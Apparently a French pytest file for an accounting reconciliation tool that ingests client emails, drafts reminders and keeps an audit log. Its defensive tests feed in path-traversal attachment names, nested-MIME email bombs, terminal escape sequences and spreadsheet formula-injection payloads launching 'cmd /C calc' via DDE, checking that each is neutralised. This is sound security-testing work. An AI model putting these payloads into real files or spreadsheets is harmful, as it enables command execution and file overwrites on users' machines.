def test_sain_nom_de_piece_jointe_traversee(tmp_path) -> None:
    for nom in ("../../depot.sqlite", "..\\..\\x.pdf", "/etc/passwd", "∕etc∕passwd"):
        (tmp_path / "m.eml").write_bytes(eml("a@b.fr", "<x@y>", fichiers=((nom, b"x"),)))
        [f] = routage.lire_eml(tmp_path / "m.eml").fichiers
        assert "/" not in f.nom and "\\" not in f.nom and f.nom not in ("..", ".")


# ===========================================================================
# 5. Donnees degenerees
# ===========================================================================


def test_regression_devise_ignoree_par_le_moteur() -> None:
    op = OperationBancaire("R1", "A", dt.date(2026, 9, 3), "CB LOXAM", Decimal("100.00"), Sens.DEBIT, devise="USD")
    pc = Piece("P1", "A", "f.pdf", "LOXAM", dt.date(2026, 9, 2), Decimal("100.00"), devise="EUR")
    [r] = Moteur().rapprocher([op], [pc])
    assert r.statut is not Statut.JUSTIFIE
    # Temoin : meme devise, le rapprochement fonctionne toujours (pas un moteur casse).
    [r] = Moteur().rapprocher([op], [Piece("P2", "A", "f.pdf", "LOXAM", dt.date(2026, 9, 2),
                                            Decimal("100.00"), devise="USD")])
    assert r.statut is Statut.JUSTIFIE


def _imbrique(n: int) -> bytes:
    corps = b"Content-Type: text/plain\r\n\r\nx\r\n"
    for _ in range(n):
        corps = b"Content-Type: message/rfc822\r\n\r\n" + corps
    return b"From: inconnu@evil.example\r\nMessage-ID: <bombe@x>\r\nMIME-Version: 1.0\r\n" + corps


def test_regression_eml_imbrique_bloque_tout_le_cycle(entree: Path, inst: cycle.Instance) -> None:
    (inst.entrant / "0-bombe.eml").write_bytes(_imbrique(1000))
    (inst.entrant / "1.eml").write_bytes(eml("compta@alpha-sarl.fr", "<ok@x>", objet="facture 120,00 EUR",
                                             fichiers=(("f_2026-09.pdf", b"%PDF"),)))
    resume = lancer(entree, inst, J0)
    assert resume.brouillons_crees == 2 and resume.propositions == 1
    assert resume.quarantaine == 1
    with open(inst.sortie / "quarantaine.csv", encoding="utf-8") as f:
        lignes = list(csv.reader(f))
    assert [l[0] for l in lignes[1:]] == ["0-bombe.eml"] and "RecursionError" in lignes[1][2]
    # Retente au cycle suivant, mais journalise une seule fois (pas de flot d'audit).
    assert lancer(entree, inst, J0).quarantaine == 1
    from rapprochement.audit import JournalAudit
    assert sum(e.action == "eml_quarantaine" for e in JournalAudit(inst.audit).lire()) == 1


def test_sain_degeneres_releve_vide_dossier_sans_contact(tmp_path) -> None:
    entree = ecrire_entree(tmp_path / "e", operations=[])
    inst = nouvelle_instance(tmp_path / "i")
    assert lancer(entree, inst, J0).operations == 0
    dossiers = [["ALPHA", "Alpha", "", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [["ALPHA", "2026-09-03", "CB", "0.00", "", "Z", "EUR"],               # montant nul : ignore
           ["ALPHA", "2026-09-03", "CB", "-12.5", "", "N", "EUR"],               # negatif
           ["ALPHA", "2099-01-01", "CB", "99999999999.12345", "", "G", "EUR"]]  # futur, enorme, 5 decimales
    entree = ecrire_entree(tmp_path / "e2", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "i2")
    r = lancer(entree, inst, J0)
    assert r.brouillons_crees == 0 and r.bloquees == 2


def test_sain_message_id_rejoue_avec_autre_contenu(entree, inst) -> None:
    for i, contenu in enumerate((b"%PDF un", b"%PDF deux", b"")):
        (inst.entrant / f"{i}.eml").write_bytes(eml("compta@alpha-sarl.fr", "<meme@x>",
                                                    fichiers=(("f.pdf", contenu),)))
    r = lancer(entree, inst, J0)
    assert r.doublons == 0 and len(cycle.lister_file(inst)) == 3
    assert lancer(entree, inst, J0).doublons == 3


def test_sain_2000_pieces_jointes(tmp_path) -> None:
    fichiers = tuple((f"f{i}.pdf", f"%PDF {i}".encode()) for i in range(2000))
    (tmp_path / "m.eml").write_bytes(eml("jean@client-a.fr", "<x@y>", objet="89,90 EUR", fichiers=fichiers))
    t = time.perf_counter()
    msg = routage.lire_eml(tmp_path / "m.eml")
    d = routage.router(msg, adresses=ADRESSES, attendues=[ATTENDUE_A], aujourdhui=J0)
    assert len(d) == 2000 and time.perf_counter() - t < 30


# ===========================================================================
# 6. CA-08 / CA-10 : reproductibilite et reprise
# ===========================================================================


def _cycle_cli(entree: Path, inst: Path, env_extra: dict[str, str]) -> None:
    env = {**os.environ, **env_extra}
    subprocess.run([sys.executable, str(RACINE / "scripts" / "cycle.py"), "cycle", "--instance", str(inst),
                    "--entree", str(entree), "--date", J0.isoformat()], check=True, env=env,
                   capture_output=True)


def _empreintes(racine: Path) -> dict[str, str]:
    return {str(p.relative_to(racine)): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in sorted(racine.rglob("*")) if p.is_file() and p.suffix != ".sqlite"
            and not p.name.startswith("depot.sqlite")}


def test_sain_ca08_independant_du_fuseau_de_la_locale_et_du_hash(tmp_path) -> None:
    entree = ecrire_entree(tmp_path / "e")
    instances = []
    messages = [eml(exp, f"<{k}@x>", objet="120,00 EUR", fichiers=((nom, b"%PDF"),))
                for k, (exp, nom) in enumerate((("compta@alpha-sarl.fr", "z_2026-09.pdf"),
                                                ("contact@beta-sas.fr", "a.pdf"), ("x@gmail.com", "b.pdf")))]
    for i, env in enumerate(({"TZ": "Pacific/Kiritimati", "PYTHONHASHSEED": "1", "LC_ALL": "C"},
                             {"TZ": "America/Adak", "PYTHONHASHSEED": "4242", "LC_ALL": "C.UTF-8"})):
        rep = tmp_path / f"i{i}"
        nouvelle_instance(rep)
        for k, brut in enumerate(messages):
            (rep / "entrant" / f"{3 - k}.eml").write_bytes(brut)
        _cycle_cli(entree, rep, env)
        instances.append(_empreintes(rep))
    assert instances[0] == instances[1]
    assert any(k.startswith("sortie/") for k in instances[0])


def test_regression_journal_tronque_refus_avant_ecriture_puis_reparation(tmp_path) -> None:
    """Contrat : journal tronque -> refus explicite AVANT toute ecriture en base ;
    `reparer-audit` retire la fin tronquee (sauvegardee) ; le cycle reprend normalement."""
    from rapprochement.audit import JournalAudit
    entree = ecrire_entree(tmp_path / "e", operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    sain = inst.audit.read_bytes()
    with open(inst.audit, "ab") as f:
        f.write(b'{"acteur":"systeme","action":"pie')          # ecriture interrompue
    ecrire_entree(tmp_path / "e", operations=OPERATIONS)
    avant_depot = etat_brut(inst)
    j1 = J0 + dt.timedelta(days=1)
    with pytest.raises(cycle.JournalNonSain):
        lancer(entree, inst, j1)
    assert etat_brut(inst) == avant_depot
    # Les decisions humaines sont refusees aussi, sans ecriture.
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    with pytest.raises(cycle.JournalNonSain):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(j1))
    assert etat_brut(inst) == avant_depot
    # Reparation par la CLI, au nom d'un validateur declare.
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", j1.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 1
    assert cli.main(["reparer-audit", "--par", "Mallory", *base]) == 1
    assert cli.main(["reparer-audit", "--par", VALIDEUSE, *base]) == 0
    [fragment] = list(inst.racine.glob("audit.jsonl.fragment-*"))
    assert fragment.read_bytes() == b'{"acteur":"systeme","action":"pie'
    assert inst.audit.read_bytes().startswith(sain)
    assert cycle.verifier_audit(inst).ok
    derniere = JournalAudit(inst.audit).lire()[-1]
    assert (derniere.action, derniere.acteur) == ("journal_repare", VALIDEUSE)
    assert cli.main(["reparer-audit", "--par", VALIDEUSE, *base]) == 0      # idempotent
    assert len(list(inst.racine.glob("audit.jsonl.fragment-*"))) == 1
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert {p.reference for p in cycle.pieces(inst)} == {"A-001", "A-002", "B-001"}
    assert cli.main(["verifier-audit", *base]) == 0


def etat_brut(inst: cycle.Instance) -> tuple:
    with Depot(inst.depot) as d:
        return (d.charger_pieces(), d.lister_brouillons(), d.file_humaine(resolue=None),
                d.historique_envois())


# ===========================================================================
# 7. CA-09 : performance
# ===========================================================================


def _gros_releve(rep: Path, n: int, n_dossiers: int = 20) -> Path:
    import random
    rnd = random.Random(7)
    dossiers = [[f"D{i:02d}", f"Societe {i}", f"compta@societe{i}.fr", "X", "15", "courtois", "C-DIRECT", ""]
                for i in range(n_dossiers)]
    fourn = ["LOXAM", "ORANGE", "EDF", "METRO", "CASTORAMA", "AMAZON", "TOTAL", "SNCF", "OVH", "FREE"]
    ops, pieces = [], []
    for i in range(n):
        d = dt.date(2026, 7, 1) + dt.timedelta(days=rnd.randrange(90))
        m = f"{rnd.randrange(1000, 500000) / 100:.2f}"
        fo = rnd.choice(fourn)
        ops.append([f"D{i % n_dossiers:02d}", d.isoformat(), f"CB {fo} {i}", m, "", f"R{i:06d}", "EUR"])
        if i % 3 == 0:
            pieces.append([f"P{i}", f"D{i % n_dossiers:02d}", f"p{i}.pdf", fo,
                           (d - dt.timedelta(days=2)).isoformat(), m, "EUR"])
    return ecrire_entree(rep, dossiers=dossiers, operations=ops, pieces=pieces)


def test_sain_ca09_5000_operations_20_dossiers_100_emails(tmp_path) -> None:
    entree = _gros_releve(tmp_path / "e", 5000)
    inst = nouvelle_instance(tmp_path / "i")
    for k in range(100):
        (inst.entrant / f"{k:04d}.eml").write_bytes(eml(
            f"compta@societe{k % 20}.fr", f"<{k}@x>", objet=f"facture {k + 10},00 EUR",
            fichiers=((f"f{k}.pdf", f"%PDF {k}".encode()),)))
    t = time.perf_counter()
    r = lancer(entree, inst, J0)
    duree = time.perf_counter() - t
    assert r.operations == 5000 and r.brouillons_crees == 20
    assert duree < 600, duree   # cible CA-09 ; mesure de reference : ~7 s


# ===========================================================================
# 8. Second passage : code nouveau (reparation du journal, quarantaine,
#    neutralisation, affichage, deblocage, domaines declares) et boucle CLI
# ===========================================================================

from rapprochement.audit import JournalAudit, JournalCorrompu  # noqa: E402
from rapprochement.parseurs import ErreurFormat  # noqa: E402


def _journal(tmp_path: Path, n: int = 4) -> JournalAudit:
    j = JournalAudit(tmp_path / "audit.jsonl")
    for i in range(n):
        j.ecrire("systeme", "action", f"objet-{i}", {"i": i},
                 horodatage=dt.datetime(2026, 10, 5, 10, i, tzinfo=dt.timezone.utc))
    return j


def _fragments(tmp_path: Path) -> list[Path]:
    return sorted(tmp_path.glob("audit.jsonl.fragment-*"))


def test_sain_reparer_refuse_fin_tronquee_plus_alteration_au_milieu(tmp_path) -> None:
    """Une falsification au milieu + une fin tronquee : rien n'est modifie, la preuve reste."""
    j = _journal(tmp_path)
    lignes = j.chemin.read_bytes().split(b"\n")
    lignes[1] = lignes[1].replace(b'"objet-1"', b'"objet-X"')
    j.chemin.write_bytes(b"\n".join(lignes) + b'{"seq":5,"acte')
    avant = j.chemin.read_bytes()
    with pytest.raises(JournalCorrompu):
        j.reparer_fin_tronquee()
    assert j.chemin.read_bytes() == avant and _fragments(tmp_path) == []
    r = j.verifier()
    assert not r.ok and r.premiere_erreur_seq == 2


@pytest.mark.parametrize("alteration", ["derniere_complete_modifiee", "seq_saute", "ligne_vide_au_milieu"])
def test_sain_reparer_ne_blanchit_pas_une_entree_complete(tmp_path, alteration) -> None:
    j = _journal(tmp_path)
    lignes = j.chemin.read_bytes().split(b"\n")[:-1]
    if alteration == "derniere_complete_modifiee":
        lignes[-1] = lignes[-1].replace(b'"objet-3"', b'"objet-Z"')
    elif alteration == "seq_saute":
        del lignes[2]
    else:
        lignes.insert(2, b"")
    j.chemin.write_bytes(b"\n".join(lignes) + b"\n" + b'{"seq":9')
    avant = j.chemin.read_bytes()
    with pytest.raises(JournalCorrompu):
        j.reparer_fin_tronquee()
    assert j.chemin.read_bytes() == avant and _fragments(tmp_path) == []


def test_regression_reparer_retire_une_entree_complete_sans_saut_de_ligne(tmp_path) -> None:
    j = _journal(tmp_path)
    j.chemin.write_bytes(j.chemin.read_bytes()[:-1])           # seul le '\n' final manque
    j.reparer_fin_tronquee()
    r = j.verifier()
    assert r.ok and r.nb_entrees == 4


def test_sain_reparations_concurrentes_et_collision_de_fragment(tmp_path) -> None:
    j = _journal(tmp_path)
    sain = j.chemin.read_bytes()
    j.chemin.write_bytes(sain + b'{"seq":5,"ac')
    # Noms de fragment deja pris pour les secondes a venir : jamais ecrases.
    maintenant = dt.datetime.now(dt.timezone.utc)
    pieges = []
    for k in range(-1, 6):
        nom = (maintenant + dt.timedelta(seconds=k)).strftime("%Y%m%dT%H%M%SZ")
        piege = tmp_path / f"audit.jsonl.fragment-{nom}"
        piege.write_bytes(b"NE PAS ECRASER")
        pieges.append(piege)
    resultats: list[int] = []
    depart = threading.Barrier(4)

    def reparer() -> None:
        depart.wait()
        resultats.append(JournalAudit(j.chemin).reparer_fin_tronquee())

    fils = [threading.Thread(target=reparer) for _ in range(4)]
    for f in fils:
        f.start()
    for f in fils:
        f.join()
    assert sorted(resultats) == [0, 0, 0, len(b'{"seq":5,"ac')]
    assert all(p.read_bytes() == b"NE PAS ECRASER" for p in pieges)
    nouveaux = [f for f in _fragments(tmp_path) if f not in pieges]
    assert len(nouveaux) == 1 and nouveaux[0].read_bytes() == b'{"seq":5,"ac'
    assert j.chemin.read_bytes() == sain and j.verifier().ok


@pytest.mark.xfail(strict=True, reason=(
    "En-tete From de 112 Ko fait de 8 000 mots encodes RFC 2047 : l'analyseur d'en-tetes de la "
    "bibliotheque standard est quadratique (mesure : 3 s et ~0,9 Go ; 224 Ko -> 17 s et 3,6 Go ; "
    "~450 Ko -> ~14 Go, processus tue par le noyau). Aucune limite de taille avant analyse, "
    "pas d'exception donc pas de quarantaine, et le fichier est relu a chaque cycle."))
def test_defaut_en_tete_from_quadratique_ralentit_tout_le_cycle(entree, inst) -> None:
    (inst.entrant / "lourd.eml").write_bytes(
        b"From: " + b"=?utf-8?q?a?= " * 8000 + b"<a@b.fr>\r\nMessage-ID: <lourd@x>\r\n\r\nx\r\n")
    t = time.perf_counter()
    lancer(entree, inst, J0)
    assert time.perf_counter() - t < 1.0


def test_sain_quarantaine_fichiers_pathologiques(entree, inst, capsys) -> None:
    """Octets nuls, charset inconnu, 8 bits bruts, boucle de frontieres, nom piege :
    le cycle va au bout, les autres messages sont traites, rien ne pilote le terminal."""
    H = b"From: inconnu@evil.example\r\nMessage-ID: <%d@x>\r\n"
    (inst.entrant / "1-nul.eml").write_bytes(H % 1 + b"Subject: a\x00b\r\n\r\n\x00\x00\r\n")
    (inst.entrant / "2-charset.eml").write_bytes(
        H % 2 + b"Content-Type: text/plain; charset=foobar\r\n\r\n12,00 EUR\r\n")
    (inst.entrant / "3-8bit.eml").write_bytes(
        H % 3 + b"Subject: \xff\xfe\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n"
        b"--b\r\nContent-Disposition: attachment; filename=\"f\xff\x1b[2J.pdf\"\r\n\r\nPDF\r\n--b--\r\n")
    (inst.entrant / "4-boucle.eml").write_bytes(
        H % 4 + b"MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n"
        + b"--b\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n" * 2000 + b"--b--\r\n")
    (inst.entrant / "5-\x1b]52;c;cGF3bmVk\x07=HYPERLINK(1).eml").write_bytes(_imbrique(1000))
    (inst.entrant / "6-ok.eml").write_bytes(eml("compta@alpha-sarl.fr", "<ok@x>", objet="facture 120,00 EUR",
                                                fichiers=(("f_2026-09.pdf", b"%PDF"),)))
    capsys.readouterr()
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert cli.main(["file", *base]) == 0
    sortie = capsys.readouterr().out
    assert not [c for c in sortie if c not in "\n" and unicodedata.category(c) in ("Cc", "Cf")]
    r = lancer(entree, inst, J0)
    assert r.propositions == 0 and r.doublons >= 1             # 6-ok deja propose
    quarantaine = cellules(inst.sortie / "quarantaine.csv")
    assert not [c for c in quarantaine if c.startswith(CARACTERES_FORMULE)]
    assert any(c.startswith("5-") for c in quarantaine)
    assert [d.dossier for d in cycle.lister_file(inst) if d.statut is StatutRoutage.PROPOSEE] == ["ALPHA"]


@pytest.mark.parametrize("valeur", [
    "=1+1", "+1+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\t=1", "\r=1",
    "=HYPERLINK(\"http://x\")\n=1", "-cmd|' /C calc'!A0", "=DDE(\"cmd\";\"/C calc\";\"x\")",
    "+33 6 12 34 56 78", "-", "=", "@",
])
def test_sain_neutraliser_formule_contrat(valeur) -> None:
    from rapprochement.rapport import neutraliser_formule
    n = neutraliser_formule(valeur)
    assert n == "'" + valeur


@pytest.mark.parametrize("valeur", ["-12.50", "+3", "-0,5", "12", "texte", "", "1=1"])
def test_sain_neutraliser_formule_laisse_les_nombres_et_le_texte(valeur) -> None:
    from rapprochement.rapport import neutraliser_formule
    assert neutraliser_formule(valeur) == valeur


@pytest.mark.parametrize("piege", ["\x9b2J", "\x1b]52;c;cGF3bmVk\x07", "\rFAUX", "\x08\x08\x08X",
                                   "‮gnp.exe", "\x85NEL", "\x1bc", " L", "\x7f"])
def test_sain_affichable_cli_file_et_pieces(tmp_path, capsys, piege) -> None:
    """Toute valeur externe affichee (Message-ID, nom de piece jointe, code, reference)."""
    dossiers = [["AL" + piege, "Alpha", "compta@alpha-sarl.fr", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [["AL" + piege, "2026-09-03", "CB" + piege, "120.00", "", "R" + piege, "EUR"]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    brut = eml("inconnu@evil.example", "<x@y>", fichiers=(("f.pdf", b"%PDF"),))
    brut = brut.replace(b"Message-ID: <x@y>", b"Message-ID: " + ("M" + piege).encode("utf-8"))
    (inst.entrant / "1.eml").write_bytes(brut)
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    capsys.readouterr()
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert cli.main(["file", *base]) == 0
    assert cli.main(["pieces", *base]) == 0
    assert cli.main(["valider", "x" + piege, "--par", VALIDEUSE, *base]) == 1
    sorties = capsys.readouterr()
    for flux in (sorties.out, sorties.err):
        assert not [c for c in flux if c != "\n" and unicodedata.category(c) in ("Cc", "Cf", "Zl", "Zp")]


def _piece_cli(inst, *args) -> int:
    return charger_cli().main([*args, "--instance", str(inst.racine), "--date", J0.isoformat()])


@pytest.mark.parametrize("motif", ["[cycle] litige", "  [cycle] litige", "[cycle]", "[cycle]x"])
def test_sain_bloquer_refuse_le_prefixe_du_cycle(entree, inst, motif) -> None:
    lancer(entree, inst, J0)
    assert _piece_cli(inst, "bloquer", "--dossier", "ALPHA", "--reference", "A-001",
                      "--par", VALIDEUSE, "--motif", motif) == 1
    assert not {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee


@pytest.mark.parametrize("motif", ["[CYCLE] litige", "​[cycle] litige", "［cycle］ litige"])
def test_sain_blocage_manuel_jamais_leve_par_le_cycle_ni_rattacher(entree, inst, motif) -> None:
    lancer(entree, inst, J0)
    assert _piece_cli(inst, "bloquer", "--dossier", "ALPHA", "--reference", "A-001",
                      "--par", VALIDEUSE, "--motif", motif) == 0
    lancer(entree, inst, J0 + dt.timedelta(days=1))
    assert {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(J0 + dt.timedelta(days=1)),
                              dossier="ALPHA", reference="A-001", id_piece="P1")
    assert p.bloquee and p.motif_blocage == motif.strip()
    assert lancer(entree, inst, J0 + dt.timedelta(days=2)).blocages_leves == 0


@pytest.mark.xfail(strict=True, reason=(
    "Le deblocage humain est memorise PAR PIECE (`deblocage-humain:<dossier>/<ref>`), pas par "
    "constat du moteur comme l'annonce `debloquer_piece` : une fois debloquee, la piece n'est "
    "plus jamais rebloquee, meme quand une AUTRE facture la justifie ; le client continue "
    "d'etre relance pour une piece que le cabinet a deja."))
def test_defaut_deblocage_humain_ignore_un_nouveau_constat(tmp_path) -> None:
    ops = [OPERATIONS[0]]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    j1, j2 = J0 + dt.timedelta(days=1), J0 + dt.timedelta(days=2)
    ecrire_entree(tmp_path / "e", operations=ops,
                  pieces=[["P1", "ALPHA", "p1.pdf", "LOXAM", "2026-09-02", "120.00", "EUR"]])
    lancer(entree, inst, j1)
    assert {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee
    cycle.debloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="P1 est une autre location",
                          maintenant=a(j1))
    ecrire_entree(tmp_path / "e", operations=ops,
                  pieces=[["P2", "ALPHA", "p2.pdf", "LOXAM", "2026-09-03", "120.00", "EUR"]])
    lancer(entree, inst, j2)
    assert {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee


def test_sain_domaines_declares_temoins(tmp_path) -> None:
    from rapprochement.modeles import Dossier
    dossiers = {
        "A": Dossier("A", "A", "jean@client-a.fr", "J", domaines=("CLIENT-A.FR.", "gmail.com")),
        "B": Dossier("B", "B", "paul@client-b.fr", "P", domaines=("partage.fr",)),
        "C": Dossier("C", "C", "x@client-c.fr", "X", domaines=("Partage.FR",)),
    }
    adresses = routage.adresses_par_dossier(dossiers)
    domaines = routage.domaines_par_dossier(dossiers)
    assert domaines["A"] == frozenset({"client-a.fr"})          # gmail.com ecarte

    def dossier_de(exp: str):
        m = MessageEntrant("<x@y>", exp, dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                           "facture 89,90 EUR", "", (FichierEntrant("f.pdf", b"P"),))
        [d] = routage.router(m, adresses=adresses, attendues=[ATTENDUE_A, ATTENDUE_B],
                             aujourdhui=J0, domaines=domaines)
        return d.dossier, d.statut, d.motif

    assert dossier_de("autre@client-a.fr")[:2] == ("A", StatutRoutage.PROPOSEE)
    assert dossier_de("jean+factures@client-a.fr")[:2] == ("A", StatutRoutage.PROPOSEE)
    assert dossier_de("x@mail.client-a.fr")[0] is None             # sous-domaine
    assert dossier_de("x@gmail.com")[0] is None                    # grand public declare : ignore
    assert dossier_de("x@partage.fr")[2] is MotifNonRoute.DOSSIER_AMBIGU
    assert dossier_de("x@xn--client-a-x.fr")[0] is None


def test_regression_domaine_declare_idna2003_replie_sur_un_autre_domaine() -> None:
    from rapprochement.modeles import Dossier
    dossiers = {"A": Dossier("A", "A", "jean@xn--strae-oqa.de", "J", domaines=("straße.de",))}
    m = MessageEntrant("<x@y>", "compta@strasse.de", dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                       "facture 89,90 EUR", "", (FichierEntrant("f.pdf", b"P"),))
    d = routage.router(m, adresses=routage.adresses_par_dossier(dossiers), attendues=[ATTENDUE_A],
                       aujourdhui=J0, domaines=routage.domaines_par_dossier(dossiers))
    assert all(x.dossier is None for x in d), d


@pytest.mark.xfail(strict=True, raises=ErreurFormat, reason=(
    "Colonne `domaines` malformee dans dossiers.csv : `ErreurFormat` n'est pas interceptee par "
    "le CLI (trace Python au lieu d'un REFUS lisible) ; le cycle de TOUS les clients s'arrete "
    "pour une cellule d'un seul dossier."))
@pytest.mark.parametrize("domaines", ["client a.fr", "jean@client-a.fr", "localhost"])
def test_defaut_cli_domaines_malformes_trace_au_lieu_d_un_refus(tmp_path, capsys, domaines) -> None:
    dossiers = [DOSSIERS[0][:8] + [domaines], DOSSIERS[1][:8] + [""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers)
    lignes = (entree / "dossiers.csv").read_text(encoding="utf-8").splitlines()
    lignes[0] += ",domaines"
    (entree / "dossiers.csv").write_text("\n".join(lignes) + "\n", encoding="utf-8")
    inst = nouvelle_instance(tmp_path / "i")
    code = charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(inst.racine),
                               "--date", J0.isoformat()])
    assert code == 1 and "domaine" in capsys.readouterr().err


@pytest.mark.xfail(strict=True, reason=(
    "Incoherence introduite par le correctif : le routage considere `jean+b@x.fr` et "
    "`jean@x.fr` comme la MEME boite (suffixe +tag), mais la planification et la limite "
    "hebdomadaire les traitent comme deux destinataires : deux e-mails le meme jour a la meme "
    "personne."))
def test_defaut_plus_tag_meme_boite_pour_le_routage_pas_pour_les_relances(tmp_path) -> None:
    dossiers = [["ALPHA", "Alpha", "jean@relais-x.fr", "J", "15", "courtois", "C-DIRECT", ""],
                ["BETA", "Beta", "jean+beta@relais-x.fr", "J", "15", "courtois", "C-DIRECT", ""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers)
    inst = nouvelle_instance(tmp_path / "i")
    assert lancer(entree, inst, J0).brouillons_crees == 1


def test_sain_boucle_cli_des_correctifs(tmp_path, capsys) -> None:
    """Chaque correctif rejoue de bout en bout par la CLI."""
    dossiers = [["ALPHA", "Alpha SARL", "gerant.alpha@hotmail.ca", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
                ["CAFÉ", "Cafe", "compta@cafe.fr", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [["ALPHA", "2026-09-03", FORMULE_LIBELLE, "120.00", "", "A-001", "USD"],
           ["CAFÉ", "2026-09-04", "CB LOXAM", "50.00", "", "C-001", "EUR"]]
    pieces = [["P1", "ALPHA", "p.pdf", "HYPERLINK", "2026-09-02", "120.00", "EUR"]]   # mauvaise devise
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops, pieces=pieces)
    inst = nouvelle_instance(tmp_path / "i", None)
    inst.validateurs.write_bytes("﻿Marie Durand\r\n".encode("utf-8"))
    (inst.entrant / "0-bombe.eml").write_bytes(_imbrique(1000))
    (inst.entrant / "1.eml").write_bytes(eml("inconnu@hotmail.ca", "<p@x>", objet="facture 120,00 EUR",
                                             fichiers=(("facture_2026-09.pdf", b"%PDF"),)))
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert {p.reference for p in cycle.pieces(inst)} == {"A-001", "C-001"}    # devise, NFC
    assert [d.statut for d in cycle.lister_file(inst)] == [StatutRoutage.NON_ROUTEE]   # domaine
    assert not [c for f in inst.sortie.glob("*.csv") for c in cellules(f) if c.startswith(CARACTERES_FORMULE)]
    ids = sorted(b.id_relance for b in cycle.brouillons(inst, StatutBrouillon.BROUILLON))
    assert len(ids) == 2
    for i in ids:
        assert cli.main(["valider", i, "--par", "marie durand", *base]) == 0       # BOM
    # Apres tous les correctifs, un envoi valide reste possible, et une seule fois.
    assert cli.main(["envoyer", ids[0], *base]) == 0
    assert cli.main(["envoyer", ids[0], *base]) == 1
    assert len(list(inst.outbox.glob("*.eml"))) == 1
    assert cli.main(["verifier-audit", *base]) == 0


def test_sain_cli_envoi_incertain_bloque_le_suivant(tmp_path, capsys) -> None:
    entree = ecrire_entree(tmp_path / "e")
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b1 = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b1.id_relance, VALIDEUSE, maintenant=a(J0))
    with pytest.raises(TimeoutError):
        cycle.envoyer_relance(inst, b1.id_relance, maintenant=a(J0), expediteur=_Coupure())
    j1 = J0 + dt.timedelta(days=1)
    for ref in ("A-001", "A-002"):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(j1), dossier="ALPHA", reference=ref, id_piece=ref)
    ecrire_entree(tmp_path / "e", operations=OPERATIONS + [
        ["ALPHA", "2026-10-02", "CB AMAZON", "33.00", "", "A-005", "EUR"]])
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", j1.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    b2 = brouillon_de(inst, "compta@alpha-sarl.fr")
    assert cli.main(["valider", b2.id_relance, "--par", VALIDEUSE, *base]) == 0
    capsys.readouterr()
    assert cli.main(["envoyer", b2.id_relance, *base]) == 1
    assert "EnvoiIncertainEnAttente" in capsys.readouterr().err
    assert list(inst.outbox.glob("*.eml")) == []
